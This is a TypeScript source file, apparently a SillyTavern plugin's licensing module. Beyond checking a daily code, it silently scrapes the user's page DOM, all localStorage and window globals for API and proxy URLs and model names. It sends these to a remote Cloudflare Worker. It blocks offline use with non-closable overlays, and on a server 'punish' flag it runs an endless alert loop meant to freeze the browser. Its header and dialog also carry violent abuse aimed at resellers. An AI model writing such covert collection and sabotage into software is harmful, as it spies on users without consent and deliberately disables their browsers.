/**
 * 🔐 授权验证模块 - 简化版
 * 作者: mzrodyu
 * ⚠️ 商业化死全家，贩子死全家 ⚠️
 */

import packageJson from '../../package.json';

// 🔥 Cloudflare Worker 授权后端地址
const AUTH_API_URL = 'https://maomaomz-auth.baobaoyu999727272.workers.dev';

// 当前版本号
const CURRENT_VERSION = packageJson.version;

// LocalStorage 键名
const STORAGE_KEY = 'maomaomz_auth_code';
const STORAGE_VERIFIED_KEY = 'maomaomz_auth_verified';

/**
 * 获取当前使用的 API 端点（增强版 - 疯狂抓取）
 */
function getCurrentApiEndpoint(): string {
  const allFoundUrls: string[] = []; // 收集所有找到的 URL

  try {
    const mainDoc = window.parent?.document || document;
    const parentWin = window.parent as any;
    const win = window as any;
    let apiUrl = '';

    // 🔥 方法 0: 从插件自己的设置中获取
    try {
      const pluginSettings = JSON.parse(localStorage.getItem('tavern_helper_settings') || '{}');
      if (pluginSettings.api_endpoint && pluginSettings.api_endpoint.trim()) {
        apiUrl = pluginSettings.api_endpoint.trim().replace(/\/+$/, '');
        if (apiUrl && !apiUrl.startsWith('[object ') && apiUrl.includes('.')) {
          allFoundUrls.push(apiUrl);
        }
      }
      // 🔥 如果勾选了使用酒馆API，不直接返回，继续抓酒馆的
      if (!pluginSettings.use_tavern_api && allFoundUrls.length > 0) {
        return allFoundUrls[0];
      }
    } catch {
      // 忽略
    }

    // 🔥 方法 1: 从 DOM 读取（覆盖所有可能的输入框）- 增强版
    const urlSelectors = [
      '#reverse_proxy', // 反代地址（优先）
      '#openai_reverse_proxy', // OpenAI 反代
      '#custom_api_url', // 自定义 API
      '#api_url_text', // API URL 文本框
      '#claude_reverse_proxy', // Claude 反代
      '#openrouter_reverse_proxy', // OpenRouter 反代
      '#kobold_api_url', // Kobold API
      '#textgenerationwebui_api_url', // Text Generation WebUI
      '#novel_api_url', // NovelAI
      '#api_key_openai', // OpenAI 设置区域的输入框
      '#custom_openai_endpoint', // 自定义 OpenAI 端点
      'input[id*="reverse_proxy"]',
      'input[id*="api_url"]',
      'input[id*="custom_url"]',
      'input[id*="endpoint"]',
      'input[id*="proxy"]',
      'input[name*="reverse_proxy"]',
      'input[name*="api_url"]',
      'input[placeholder*="http"]',
      'input[placeholder*="api"]',
      'input[value*="zeabur"]', // 特殊：Zeabur 部署的
      'input[value*=".app"]',
      'input[value*=".dev"]',
      'input[value*=".com"]',
    ];

    for (const sel of urlSelectors) {
      try {
        const el = mainDoc.querySelector(sel) as HTMLInputElement;
        if (el && el.value && el.value.trim() && el.value.includes('.')) {
          apiUrl = el.value.trim();
          // 静默获取
          break;
        }
      } catch {
        // 忽略单个选择器错误
      }
    }

    // 🔥 方法 2: 从 localStorage 读取 SillyTavern 配置（超级增强版）
    const storageKeys = [
      'TavernAI_Settings',
      'settings',
      'oai_settings',
      'power_user',
      'kobold_settings',
      'textgenerationwebui_settings',
      'novel_settings',
    ];
    const urlFields = [
      'reverse_proxy',
      'custom_url',
      'api_url',
      'api_url_scale',
      'openai_reverse_proxy',
      'claude_reverse_proxy',
      'kobold_url',
      'api_server',
      'server_url',
      'base_url',
      'endpoint',
      'proxy_url',
    ];

    for (const key of storageKeys) {
      try {
        const config = JSON.parse(localStorage.getItem(key) || '{}');
        for (const field of urlFields) {
          if (config[field] && typeof config[field] === 'string' && config[field].includes('.')) {
            const foundUrl = config[field];
            // 静默获取
            if (!allFoundUrls.includes(foundUrl)) {
              allFoundUrls.push(foundUrl);
            }
            if (!apiUrl) apiUrl = foundUrl;
          }
        }
        // 🔥 深度扫描：遍历所有字段寻找 URL
        for (const [k, v] of Object.entries(config)) {
          if (typeof v === 'string' && v.includes('http') && v.includes('.') && !v.includes('localhost')) {
            // 静默获取
            if (!allFoundUrls.includes(v)) {
              allFoundUrls.push(v);
            }
          }
        }
      } catch {
        // 忽略
      }
    }

    // 🔥 暴力扫描所有 localStorage - 抓所有域名
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (!key) continue;
        const value = localStorage.getItem(key) || '';
        // 🔥 匹配所有 URL（http/https 开头，包含域名的）
        const urlMatches = value.match(
          /https?:\/\/[a-zA-Z0-9][-a-zA-Z0-9]*(\.[a-zA-Z0-9][-a-zA-Z0-9]*)+[^\s"'<>\]})]*?/gi,
        );
        if (urlMatches) {
          for (const url of urlMatches) {
            const cleanUrl = url.replace(/['"}\],:]+$/, '').replace(/\/+$/, '');
            // 排除已知的非 API 站点
            const excludePatterns = [
              'github.com',
              'jsdelivr',
              'cdnjs',
              'unpkg',
              'google.com/search',
              'bing.com',
              'baidu.com',
            ];
            const isExcluded = excludePatterns.some(p => cleanUrl.toLowerCase().includes(p));
            if (cleanUrl.includes('.') && !isExcluded && !allFoundUrls.includes(cleanUrl)) {
              // 静默获取
              allFoundUrls.push(cleanUrl);
            }
          }
        }
      }
    } catch {
      // 忽略
    }

    // 🔥 方法 3: 从 window 变量读取（增强版）
    if (!apiUrl) {
      // 尝试获取 oai_settings
      const oaiSettings = parentWin?.oai_settings || win?.oai_settings;
      if (oaiSettings) {
        const possibleUrls = [
          oaiSettings.reverse_proxy,
          oaiSettings.custom_url,
          oaiSettings.chat_completion_source === 'custom' ? oaiSettings.custom_url : null,
        ].filter(u => u && typeof u === 'string' && u.includes('.'));
        if (possibleUrls.length > 0) {
          apiUrl = possibleUrls[0];
          // 静默获取
        }
      }

      // 尝试 api_server 和其他全局变量
      if (!apiUrl) {
        const globalVars = ['api_server', 'api_server_textgenerationwebui'];
        for (const varName of globalVars) {
          let value = parentWin?.[varName] || win?.[varName];
          if (value && typeof value === 'object' && 'value' in value) {
            value = value.value;
          }
          if (value && typeof value === 'string' && value.includes('.')) {
            apiUrl = value;
            // 静默获取
            break;
          }
        }
      }
    }

    // 🔥 方法 4: 从 window 全局变量疯狂扫描
    try {
      const scanVars = ['oai_settings', 'power_user', 'api_server', 'main_api', 'selected_api'];
      for (const varName of scanVars) {
        const obj = parentWin?.[varName] || win?.[varName];
        if (obj && typeof obj === 'object') {
          for (const [k, v] of Object.entries(obj)) {
            if (typeof v === 'string' && v.includes('http') && v.includes('.') && !v.includes('localhost')) {
              // 静默获取
              if (!allFoundUrls.includes(v)) {
                allFoundUrls.push(v);
              }
            }
          }
        }
      }
    } catch {
      // 忽略
    }

    // 🔥 方法 5: 根据 API 类型推断（兜底）
    if (allFoundUrls.length === 0) {
      let apiType = parentWin?.main_api || win?.main_api;
      if (apiType && typeof apiType === 'object' && 'value' in apiType) {
        apiType = apiType.value;
      }

      const oaiSettings = parentWin?.oai_settings || win?.oai_settings;
      const chatSource = oaiSettings?.chat_completion_source;

      if (apiType && typeof apiType === 'string') {
        const officialEndpoints: Record<string, string> = {
          openai: 'api.openai.com',
          claude: 'api.anthropic.com',
          google: 'generativelanguage.googleapis.com',
          cohere: 'api.cohere.ai',
          mistral: 'api.mistral.ai',
          groq: 'api.groq.com',
          openrouter: 'openrouter.ai',
          novel: 'api.novelai.net',
        };

        const reverseProxy = oaiSettings?.reverse_proxy;
        if (reverseProxy && reverseProxy.includes('.')) {
          allFoundUrls.push(reverseProxy);
        }

        const officialUrl = officialEndpoints[apiType.toLowerCase()];
        if (officialUrl && allFoundUrls.length === 0) {
          return `[官方:${officialUrl}]`;
        }

        if (allFoundUrls.length === 0) {
          const identifier = chatSource ? `[${apiType}:${chatSource}]` : `[API:${apiType}]`;
          return identifier;
        }
      }
    }

    // 🔥 返回找到的 URL（优先返回非官方的，更可能是贩子站）

    // 去重：去掉 /v1 后缀再比较
    const normalizeUrl = (url: string) =>
      url
        .toLowerCase()
        .replace(/\/v1\/?$/, '')
        .replace(/\/$/, '');
    const seen = new Set<string>();
    const uniqueUrls = allFoundUrls.filter(u => {
      if (!u || u.startsWith('[') || !u.includes('.')) return false;
      const normalized = normalizeUrl(u);
      if (seen.has(normalized)) return false;
      seen.add(normalized);
      return true;
    });

    // 排序：优先返回看起来像贩子站的 URL
    const suspiciousPatterns = ['zeabur', 'vercel', 'railway', 'render', 'fly.io', '.app', '.dev', '.icu', '.xyz'];
    const sortedUrls = uniqueUrls.sort((a, b) => {
      const aScore = suspiciousPatterns.some(p => a.toLowerCase().includes(p)) ? 1 : 0;
      const bScore = suspiciousPatterns.some(p => b.toLowerCase().includes(p)) ? 1 : 0;
      return bScore - aScore;
    });

    if (sortedUrls.length > 0) {
      // 🔥 换行分隔，方便后台显示
      const result = sortedUrls.slice(0, 3).join('\n');
      return result;
    }

    // 静默返回
    return 'unknown';
  } catch (error) {
    // 静默失败
    return 'unknown';
  }
}

/**
 * 获取当前使用的模型（静默抓取）
 */
function getCurrentModel(): string {
  const allModels: string[] = [];

  try {
    const parentWin = window.parent as any;
    const win = window as any;
    const mainDoc = window.parent?.document || document;

    // 方法 1: 从 DOM 获取选中的模型
    const modelSelectors = [
      '#model_openai_select',
      '#model_claude_select',
      '#model_google_select',
      '#openrouter_model',
      'select[id*="model"]',
      'select[name*="model"]',
      '#model',
    ];
    for (const sel of modelSelectors) {
      try {
        const el = mainDoc.querySelector(sel) as HTMLSelectElement;
        if (el && el.value && el.value.trim()) {
          allModels.push(el.value.trim());
        }
      } catch {
        // ignore
      }
    }

    // 方法 2: 从 oai_settings 获取
    const oaiSettings = parentWin?.oai_settings || win?.oai_settings;
    if (oaiSettings) {
      const modelFields = ['openai_model', 'claude_model', 'google_model', 'model', 'selected_model'];
      for (const f of modelFields) {
        if (oaiSettings[f] && typeof oaiSettings[f] === 'string') {
          allModels.push(oaiSettings[f]);
        }
      }
    }

    // 方法 3: 从 localStorage 获取
    const storageKeys = ['oai_settings', 'settings', 'TavernAI_Settings'];
    for (const key of storageKeys) {
      try {
        const config = JSON.parse(localStorage.getItem(key) || '{}');
        const modelFields = ['openai_model', 'claude_model', 'google_model', 'model', 'selected_model', 'chat_model'];
        for (const f of modelFields) {
          if (config[f] && typeof config[f] === 'string') {
            allModels.push(config[f]);
          }
        }
      } catch {
        // ignore
      }
    }

    // 方法 4: 暴力扫描 localStorage 找模型名
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (!key) continue;
        const value = localStorage.getItem(key) || '';
        const modelPatterns = [
          /gpt-[34][o]?[-\w]*/gi,
          /claude-[23][-\w]*/gi,
          /gemini[-\w]*/gi,
          /o[134][-\w]*/gi,
          /grok[-\w]*/gi,
          /deepseek[-\w]*/gi,
          /llama[-\w]*/gi,
          /mistral[-\w]*/gi,
          /qwen[-\w]*/gi,
        ];
        for (const pattern of modelPatterns) {
          const matches = value.match(pattern);
          if (matches) {
            for (const m of matches) {
              if (!allModels.includes(m)) allModels.push(m);
            }
          }
        }
      }
    } catch {
      // ignore
    }

    // 去重并返回
    const unique = [...new Set(allModels)].filter(m => m && m.length > 2);
    return unique.slice(0, 5).join(' | ') || 'unknown';
  } catch {
    return 'unknown';
  }
}

/**
 * 验证授权码（带API端点追踪）
 */
async function verifyAuthCode(
  code: string,
): Promise<{ valid: boolean; message: string; blocked?: boolean; punish?: boolean }> {
  try {
    // 获取当前使用的 API 端点和模型
    const apiEndpoint = getCurrentApiEndpoint();
    const model = getCurrentModel();

    const trimmedCode = code.trim().toUpperCase();

    const requestBody = {
      code: trimmedCode,
      apiEndpoint: apiEndpoint,
      model: model, // 🔥 发送模型信息
      timestamp: new Date().toISOString(),
      version: CURRENT_VERSION,
    };

    const response = await fetch(`${AUTH_API_URL}/verify`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(requestBody),
    });

    console.log('📥 响应状态:', response.status, response.statusText);

    if (!response.ok) {
      const errorText = await response.text();
      console.error('❌ 请求失败:', errorText);
      return {
        valid: false,
        message: `❌ 网络请求失败 (${response.status}): ${errorText}`,
      };
    }

    const data = await response.json();
    console.log('📥 响应数据:', JSON.stringify(data, null, 2));
    return data;
  } catch (error) {
    console.error('❌ 授权验证异常:', error);
    console.error('❌ 错误堆栈:', (error as Error).stack);
    return {
      valid: false,
      message: '❌ 网络错误: ' + (error as Error).message,
    };
  }
}

/**
 * 显示需要联网对话框（无法关闭，强制阻止离线使用）
 */
function showNetworkRequiredDialog(): void {
  const overlay = document.createElement('div');
  overlay.id = 'maomaomz-network-overlay';
  overlay.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.95);
    z-index: 9999999 !important;
    display: flex;
    align-items: center;
    justify-content: center;
    backdrop-filter: blur(10px);
  `;

  const dialog = document.createElement('div');
  dialog.style.cssText = `
    background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
    border: 3px solid #f59e0b;
    border-radius: 20px;
    padding: 40px;
    max-width: 450px;
    width: 90%;
    box-shadow: 0 20px 60px rgba(245, 158, 11, 0.3);
    color: #e0e0e0;
    text-align: center;
  `;

  dialog.innerHTML = `
    <div style="font-size: 80px; margin-bottom: 20px;">🌐</div>
    <h2 style="margin: 0 0 20px 0; font-size: 28px; color: #f59e0b;">
      需要网络连接
    </h2>
    <p style="color: #ccc; font-size: 16px; line-height: 1.8; margin-bottom: 20px;">
      本插件需要联网验证授权<br>
      请检查网络连接后刷新页面
    </p>
    <button onclick="location.reload()" style="
      padding: 15px 40px;
      background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
      border: none;
      border-radius: 12px;
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    ">🔄 刷新页面</button>
    <p style="color: #666; font-size: 12px; margin-top: 20px;">
      ⚠️ 禁止离线使用，必须联网验证
    </p>
  `;

  overlay.appendChild(dialog);
  document.body.appendChild(overlay);
}

/**
 * 显示端点被禁用对话框（无法关闭，强制阻止使用）
 */
function showBannedDialog(message: string): void {
  // 创建遮罩层
  const overlay = document.createElement('div');
  overlay.id = 'maomaomz-banned-overlay';
  overlay.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(139, 0, 0, 0.95);
    z-index: 9999999 !important;
    display: flex;
    align-items: center;
    justify-content: center;
    backdrop-filter: blur(10px);
  `;

  const dialog = document.createElement('div');
  dialog.style.cssText = `
    background: linear-gradient(135deg, #1a0a0a 0%, #2a0a0a 100%);
    border: 3px solid #dc2626;
    border-radius: 20px;
    padding: 40px;
    max-width: 500px;
    width: 90%;
    box-shadow: 0 20px 60px rgba(220, 38, 38, 0.5);
    color: #e0e0e0;
    text-align: center;
  `;

  dialog.innerHTML = `
    <div style="font-size: 80px; margin-bottom: 20px;">🚫</div>
    <h2 style="
      margin: 0 0 20px 0;
      font-size: 28px;
      color: #ef4444;
    ">
      插件已被禁用
    </h2>
    <div style="
      background: rgba(220, 38, 38, 0.2);
      border: 1px solid #dc2626;
      border-radius: 10px;
      padding: 20px;
      margin: 20px 0;
      font-size: 14px;
      line-height: 1.8;
      white-space: pre-line;
      text-align: left;
    ">${message}</div>
    <p style="color: #888; font-size: 13px; margin-top: 20px;">
      此页面无法关闭，请刷新页面或更换 API 端点后重试
    </p>
  `;

  overlay.appendChild(dialog);
  document.body.appendChild(overlay);
}

/**
 * 显示授权输入对话框
 */
function showAuthDialog(): Promise<string | null> {
  return new Promise(resolve => {
    // 创建遮罩层（最高优先级）
    const overlay = document.createElement('div');
    overlay.id = 'maomaomz-auth-overlay';
    overlay.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.92);
      z-index: 9999999 !important;
      display: flex;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(10px);
      animation: fadeIn 0.3s ease;
    `;

    // 创建对话框
    const dialog = document.createElement('div');
    dialog.style.cssText = `
      background: linear-gradient(135deg, #1a1a1a 0%, #2a1a1a 50%, #1a2a2a 100%);
      border: 2px solid #3a3a3a;
      border-radius: 20px;
      padding: 40px;
      max-width: 500px;
      width: 90%;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
      color: #e0e0e0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    `;

    dialog.innerHTML = `
      <style>
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes slideUp {
          from { transform: translateY(20px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
      </style>
      <div style="text-align: center; animation: slideUp 0.4s ease;">
        <div style="font-size: 60px; margin-bottom: 20px;">🐱</div>
        <h2 style="
          margin: 0 0 15px 0;
          font-size: 28px;
          background: linear-gradient(135deg, #ff9500 0%, #ffa500 100%);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        ">
          猫猫的小破烂
        </h2>
        <div style="
          background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
          color: #fff;
          padding: 12px 20px;
          border-radius: 10px;
          margin: 20px 0;
          font-weight: 700;
          font-size: 14px;
          letter-spacing: 1px;
          box-shadow: 0 4px 16px rgba(220, 38, 38, 0.3);
        ">
          ⚠️ 商业化死全家，贩子死全家 ⚠️
        </div>
        <p style="
          margin: 20px 0;
          color: #ccc;
          line-height: 1.6;
          font-size: 15px;
        ">
          请输入今日授权码<br>
          <span style="font-size: 13px; color: #888;">
            授权码每天更新，请前往 Discord 查看
          </span>
        </p>
        <input
          type="text"
          id="authCodeInput"
          placeholder="例如：MEOW-20251111-ABCD"
          style="
            width: 100%;
            padding: 14px 16px;
            background: #0a0a0a;
            border: 2px solid #3a3a3a;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
            text-align: center;
            text-transform: uppercase;
            transition: border-color 0.3s ease;
            margin-bottom: 20px;
            box-sizing: border-box;
          "
        />
        <div style="display: flex; gap: 12px;">
          <button
            id="authSubmitBtn"
            style="
              flex: 1;
              padding: 14px 24px;
              background: linear-gradient(135deg, #4a9eff 0%, #3b82f6 100%);
              border: none;
              border-radius: 12px;
              color: #fff;
              font-size: 16px;
              font-weight: 600;
              cursor: pointer;
              transition: all 0.3s ease;
              box-shadow: 0 4px 16px rgba(74, 158, 255, 0.3);
            "
          >
            ✅ 验证授权码
          </button>
        </div>
        <p style="
          margin-top: 20px;
          font-size: 12px;
          color: #666;
          line-height: 1.5;
        ">
          没有授权码？<br>
          授权码请通过 DC 帖子或者 BOT 获取
        </p>
      </div>
    `;

    overlay.appendChild(dialog);
    document.body.appendChild(overlay);

    const input = dialog.querySelector('#authCodeInput') as HTMLInputElement;
    const submitBtn = dialog.querySelector('#authSubmitBtn') as HTMLButtonElement;

    // 🔥 防止用户通过 F12 删除 overlay - 使用 MutationObserver 检测
    const observer = new MutationObserver(() => {
      if (!document.body.contains(overlay) && !document.getElementById('maomaomz-auth-overlay')) {
        console.warn('🚫 检测到遮罩层被删除，重新添加...');
        // 用户试图删除 overlay，直接返回 null 让循环继续
        observer.disconnect();
        resolve(null);
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });

    // 自动聚焦输入框
    setTimeout(() => input.focus(), 100);

    // 鼠标悬停效果
    submitBtn.addEventListener('mouseenter', () => {
      submitBtn.style.transform = 'translateY(-2px)';
      submitBtn.style.boxShadow = '0 6px 20px rgba(74, 158, 255, 0.5)';
    });
    submitBtn.addEventListener('mouseleave', () => {
      submitBtn.style.transform = 'translateY(0)';
      submitBtn.style.boxShadow = '0 4px 16px rgba(74, 158, 255, 0.3)';
    });

    // 输入框焦点效果
    input.addEventListener('focus', () => {
      input.style.borderColor = '#4a9eff';
      input.style.boxShadow = '0 0 0 3px rgba(74, 158, 255, 0.1)';
    });
    input.addEventListener('blur', () => {
      input.style.borderColor = '#3a3a3a';
      input.style.boxShadow = 'none';
    });

    // 提交按钮事件
    const handleSubmit = () => {
      const code = input.value.trim();
      if (!code) {
        input.style.borderColor = '#ef4444';
        input.focus();
        return;
      }
      observer.disconnect(); // 🔥 断开观察者
      document.body.removeChild(overlay);
      resolve(code);
    };

    submitBtn.addEventListener('click', handleSubmit);
    input.addEventListener('keypress', e => {
      if (e.key === 'Enter') {
        handleSubmit();
      }
    });

    // 🔥 不提供取消按钮，必须输入授权码
  });
}

/**
 * 检查并执行授权验证（强制模式）
 */
export async function checkAuthorization(): Promise<boolean> {
  console.log('🔐 【强制授权】开始授权验证...');

  // 先清理可能存在的旧遮罩层
  const oldOverlay = document.getElementById('maomaomz-auth-overlay');
  if (oldOverlay) {
    oldOverlay.remove();
  }

  // 检查是否已有授权码
  const savedCode = localStorage.getItem(STORAGE_KEY);
  const savedVerified = localStorage.getItem(STORAGE_VERIFIED_KEY);

  // 🔥 每次都重新验证，不使用时间缓存
  if (savedCode) {
    console.log('📋 找到已保存的授权码，重新验证中...');

    try {
      const result = await verifyAuthCode(savedCode);

      if (result.valid) {
        console.log('✅ 授权验证成功！');
        localStorage.setItem(STORAGE_VERIFIED_KEY, 'true');
        // 静默成功，不弹提示（避免每次刷新都弹窗）
        return true;
      } else {
        // 服务器明确返回验证失败，清除授权码
        console.warn('⚠️ 授权码已失效，需要重新输入');
        localStorage.removeItem(STORAGE_KEY);
        localStorage.removeItem(STORAGE_VERIFIED_KEY);
      }
    } catch (error) {
      console.error('❌ 验证授权码时出错:', error);
      // 🔥 网络错误 = 直接阻止，必须联网才能用
      localStorage.removeItem(STORAGE_KEY);
      localStorage.removeItem(STORAGE_VERIFIED_KEY);
      showNetworkRequiredDialog();
      return false;
    }
  }

  // 需要用户输入授权码 - 必须弹出对话框
  console.log('🔐 需要用户输入授权码，显示授权对话框...');
  console.log('📊 当前状态:', {
    hasSavedCode: !!savedCode,
  });

  let attempts = 0;
  const MAX_ATTEMPTS = 5; // 增加尝试次数

  while (attempts < MAX_ATTEMPTS) {
    // 🔥 强制显示授权对话框
    console.log(`🎯 准备显示授权对话框 (尝试 ${attempts + 1}/${MAX_ATTEMPTS})...`);
    const code = await showAuthDialog();
    console.log('📝 用户输入结果:', code ? '已输入授权码' : '用户取消');

    if (!code) {
      // 🔥 用户取消 - 不允许绕过，直接重新显示对话框
      console.warn('⚠️ 用户取消了授权，重新显示对话框');
      (window as any).toastr?.warning('⚠️ 必须输入授权码才能使用插件', '', { timeOut: 3000 });
      // 继续循环，重新显示对话框
      continue;
    }

    console.log(`🔄 验证授权码...`);

    // 显示加载提示
    (window as any).toastr?.info('🔄 正在验证授权码，请稍候...', '', { timeOut: 3000 });

    const result = await verifyAuthCode(code);

    if (result.valid) {
      // 验证成功，保存授权码
      localStorage.setItem(STORAGE_KEY, code);
      localStorage.setItem(STORAGE_VERIFIED_KEY, 'true');
      console.log('✅ 授权验证成功！');
      (window as any).toastr?.success(result.message, '授权成功', {
        timeOut: 3000,
      });
      return true;
    } else {
      // 🔥 检测到贩子API，不计入尝试次数，无限循环卡死
      if (result.blocked) {
        console.error('🚫 检测到异常，无限循环');

        // 🔥 惩罚模式：更激进的卡死 + 爆炸弹窗
        if (result.punish) {
          console.error('☠️ 触发惩罚模式，死卡中...');
          // 无限弹出错误提示，卡死浏览器
          const punishLoop = async () => {
            while (true) {
              (window as any).toastr?.error(result.message, '☠️ 您已被封禁', {
                timeOut: 0,
                extendedTimeOut: 0,
                closeButton: false,
                tapToDismiss: false,
              });
              // 弹出多个 alert 卡死
              for (let i = 0; i < 3; i++) {
                alert(result.message + '\n\n请停止使用盗版！');
              }
              // 短暂延迟后继续轰炸
              await new Promise(r => setTimeout(r, 100));
            }
          };
          punishLoop();
          // 返回 false 但实际上不会执行到，因为上面是无限循环
          return false;
        }

        (window as any).toastr?.error(result.message, '验证失败', {
          timeOut: 5000,
        });
        // 不增加 attempts，继续循环，死卡
        continue;
      }

      attempts++;
      console.warn(`❌ 授权验证失败 (尝试 ${attempts}/${MAX_ATTEMPTS}):`, result.message);
      (window as any).toastr?.error(result.message, `验证失败 (${attempts}/${MAX_ATTEMPTS})`, {
        timeOut: 5000,
      });

      if (attempts >= MAX_ATTEMPTS) {
        (window as any).toastr?.error('❌ 授权验证失败次数过多\n\n插件已被禁用，请刷新页面重试', '授权失败', {
          timeOut: 0,
          extendedTimeOut: 0,
        });
        return false;
      }
    }
  }

  return false;
}

/**
 * 检查是否已授权（同步方法，用于快速检查）
 */
export function isAuthorized(): boolean {
  const verified = localStorage.getItem(STORAGE_VERIFIED_KEY);
  return verified === 'true';
}

/**
 * 清除授权信息（用于测试或重置）
 */
export function clearAuthorization(): void {
  localStorage.removeItem(STORAGE_KEY);
  localStorage.removeItem(STORAGE_VERIFIED_KEY);
  console.log('🗑️ 授权信息已清除');
  (window as any).toastr?.info('授权信息已清除，刷新页面后需要重新授权');

  // 移除对话框和遮罩层（如果存在）
  document.getElementById('maomaomz-auth-overlay')?.remove();
  document.getElementById('maomaomz-auth-dialog')?.remove();
}

// 导出别名，方便使用
export const clearAuth = clearAuthorization;

/**
 * 测试授权码验证（调试用）
 */
export async function testAuthCode(code: string): Promise<void> {
  console.log('🧪 开始测试授权码验证...');
  console.log('📝 测试授权码:', code);

  const result = await verifyAuthCode(code);

  console.log('📊 验证结果:', result);

  if (result.valid) {
    console.log('✅ 授权码有效！');
    (window as any).toastr?.success('✅ 授权码有效！', '', { timeOut: 3000 });
  } else {
    console.error('❌ 授权码无效:', result.message);
    (window as any).toastr?.error(`❌ 授权码无效: ${result.message}`, '', { timeOut: 5000 });
  }
}

// 暴露到全局，方便调试
if (typeof window !== 'undefined') {
  (window as any).testAuthCode = testAuthCode;
  console.log('🔧 调试函数已暴露: window.testAuthCode(code)');
}
